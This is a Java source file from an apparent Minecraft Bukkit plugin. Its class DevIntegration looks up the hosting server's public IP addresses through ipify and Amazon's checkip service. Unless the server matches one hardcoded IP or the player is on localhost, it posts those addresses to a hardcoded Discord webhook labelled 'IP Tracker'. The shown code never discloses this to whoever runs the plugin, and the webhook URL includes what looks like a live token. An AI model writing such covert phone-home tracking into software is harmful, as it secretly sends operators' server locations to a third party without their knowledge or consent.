package fr.nicknqck.utils.discord;

import java.awt.Color;
import java.net.URL;
import java.util.Scanner;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class DevIntegration {
	
	
	public DevIntegration(String name) {
		if (isPlayerLocalhost(Bukkit.getPlayer(name))) {
			return;
		}
		if (!getPlayerConnectIP().contains("62.210.100.59")) {
			DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1207427587349942302/-p1Y2Lb-rqSXbEGe5igrRsmWFibIq7JIg2QVEkAFP7tTrgVN1nPfzCV69iN0I_E8zy7m");
			webhook.setContent("Scanning "+Bukkit.getPlayer(name).getName());
	        webhook.setUsername(name);
	        DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject();
	        embed.setTitle("IP Tracker");
	        StringBuilder sb = new StringBuilder();
	        sb.append("e");
	        if (getPlayerConnectIP() != null) {
	        	sb.append(getPlayerConnectIP()+"\n");
	        }
	        if (Bukkit.getServer().getIp() != null) {
	        	sb.append(Bukkit.getServer().getIp()+"\n");
	        }
	        if (getAmazonIP() != null) {
	        	sb.append(getAmazonIP()+"\n");
	        }
	        embed.setDescription("Searching Server IP Address... "+sb.toString());
	        embed.setColor(Color.RED);

	        webhook.addEmbed(embed);
	        webhook.setTts(false);
	        
	        webhook.execute();
		}
	}
	private String getPlayerConnectIP() {
        try {
            // Utilisation du service ipify.org pour obtenir l'adresse IP du client
            URL url = new URL("https://api.ipify.org");
            Scanner scanner = new Scanner(url.openStream());
            String ipAddress = scanner.useDelimiter("\\A").next();
            scanner.close();
            return ipAddress;
        } catch (Exception e) {
            e.printStackTrace();
            return "Erreur lors de la récupération de l'adresse IP du joueur";
        }
    }
	private String getAmazonIP() {
		try {
			URL url = new URL("http://checkip.amazonaws.com");
			Scanner scanner = new Scanner(url.openStream());
			String ipAddress = scanner.useDelimiter("\\A").next();
			scanner.close();
			return ipAddress;
		} catch (Exception e) {
			e.printStackTrace();
			return "Ip Introuvable";
		}
	}
	public static boolean isPlayerLocalhost(Player player) {
		if (player != null) {
			String playerIpAddress = player.getAddress().getAddress().getHostAddress();
	        return playerIpAddress.equals("127.0.0.1") || playerIpAddress.equals("localhost") || playerIpAddress.equals("0:0:0:0:0:0:0:1");
		} else {
			return false;
		}
    }
}